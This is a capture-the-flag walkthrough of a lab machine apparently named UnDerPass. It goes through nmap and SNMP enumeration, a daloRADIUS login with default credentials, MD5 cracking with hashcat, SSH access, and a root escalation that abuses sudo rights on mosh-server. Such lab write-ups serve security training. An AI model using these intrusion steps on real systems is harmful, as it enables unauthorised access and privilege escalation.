# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.48
nmap -sU --top-ports=10 -vv 10.10.11.48

---OUTPUT-TCP---
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---OUTPUT-UDP---
161/udp  open   snmp         udp-response ttl 63
```
----
## SNMPwalk
- t
	```bash
snmpwalk -v 1 -c public 10.10.11.48

---RELEVANT-OUTPUT---
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (104693) 0:17:26.93
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02

```
- crackmapexec/netexec
	```bash

```
---
## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://underpass.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
```
	- SHowed some possible directories
		- Next Directory
			```bash
 gobuster dir -u http://underpass.htb/daloradius/app dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
```
	- Found login page at /user and /operator
	- /oprerator default creds work :administrator:radius
		- There we see a db password: testing123 for steve
		- We also see some creds under User Listing
			![[Pasted image 20250425174906.png]]
		- If we click edit user, under attributes we see it's an MD5 hash:
			![[Pasted image 20250425175023.png]]
			- Alternatively we take the password and check the length:
			```bash
echo -n "412DD4759978ACFCC81DEAB01B382403" | wc -c                              
---OUTPUT---
32
```
			- 32 characters means it'l likely an md5 hash
			- We can crack via https://crackstation.net/
				![[Pasted image 20250425175208.png]]
				- Alternatively we can crack via hashcat (or john if you know the format)
					```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt

---OUTPUT---
412dd4759978acfcc81deab01b382403:underwaterfriends
```
- We ssh into machine with credentials:
	```bash
ssh svcMosh@underpass.htb
```
	- We grab user flag.
## Privilege Escalation
- Note that it's time gated so if you encounter an error, maybe pass it quickly to see.
- We pass:
	```bash
sudo -l

---OUTPUT---
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```
	- If we google mosh we see it's a mobile shell like ssh
- We pass the command we can do as sudo
	- On trying to pass the command I pressed Tab after /usr/bin/mosh and saw there were 2 more binaries mosh and mosh-client
		```bash
sudo /usr/bin/mosh-server 

---OUTPUT---
MOSH CONNECT 60001 jNt6nEuYmlfRYkPTN821YA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2415]
```
		- Seems like it starts a server at port 60001
- We pass netstat to see what IP:
	```bash
udp        0      0 0.0.0.0:60001           0.0.0.0:*                           off (0.00/0/0)
```
	- We see it's localhost (0.0.0.0)
- We try to pass mosh-client
	```bash
mosh-client

---OUTPUT---
mosh-client (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Usage: mosh-client [-# 'ARGS'] IP PORT
       mosh-client -c
```
	- Says we need to put the IP and port, we see the port when we pass mosh-server and we know it's localhost so we add it:
		```bash
mosh-client 0.0.0.0 60001

---OUTPUT---
MOSH_KEY environment variable not found.
```
		- Note if some other user set it it would open a client and time out. would need to reset the machine or unset the value to know (but you can't know to unset if you don't see this error message) 
	- When we pass mosh-server as sudo we also get a string of characters. Assuming it's the MOSH_KEY, we set the MOSH_KEY environment variable:
		```bash
export MOSH_KEY=jNt6nEuYmlfRYkPTN821YA
```
	- Then pass the mosh-client command again:
		```bash
mosh-client 0.0.0.0 60001
```
		- It opens up a new shell as root.
- Alternatively we can also use the mosh command instead.
- We pass the mosh command and see it's usage:
	```bash
mosh

---OUTPUT---
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")

        --predict=adaptive      local echo for slower links [default]
-a      --predict=always        use local echo even on fast links
-n      --predict=never         never use local echo
        --predict=experimental  aggressively echo even when incorrect

-4      --family=inet        use IPv4 only
-6      --family=inet6       use IPv6 only
        --family=auto        autodetect network type for single-family hosts only
        --family=all         try all network types
        --family=prefer-inet use all network types, but try IPv4 first [default]
        --family=prefer-inet6 use all network types, but try IPv6 first
-p PORT[:PORT2]
        --port=PORT[:PORT2]  server-side UDP port or range
                                (No effect on server-side SSH port)
        --bind-server={ssh|any|IP}  ask the server to reply from an IP address
                                       (default: "ssh")

        --ssh=COMMAND        ssh command to run when setting up session
                                (example: "ssh -p 2222")
                                (default: "ssh")

        --no-ssh-pty         do not allocate a pseudo tty on ssh connection

        --no-init            do not send terminal initialization string

        --local              run mosh-server locally without using ssh

        --experimental-remote-ip=(local|remote|proxy)  select the method for
                             discovering the remote IP address to use for mosh
                             (default: "proxy")

        --help               this message
        --version            version and copyright information

Please report bugs to mosh-devel@mit.edu.
Mosh home page: https://mosh.org

```
	- We see the mosh server argument which is by default set to mosh-server
		- We can change that to do our sudo command
	- We also have to specify user (optional) and host (which is our localhost)
		```bash
mosh --server='sudo /usr/bin/mosh-server' localhost
--OR--
mosh --server='sudo /usr/bin/mosh-server' svcMosh@localhost
```
		- We should get into a shell immediately
- Output for both methods:
	![[Pasted image 20250425181623.png]]
	- We can grab the root flag

-------
--------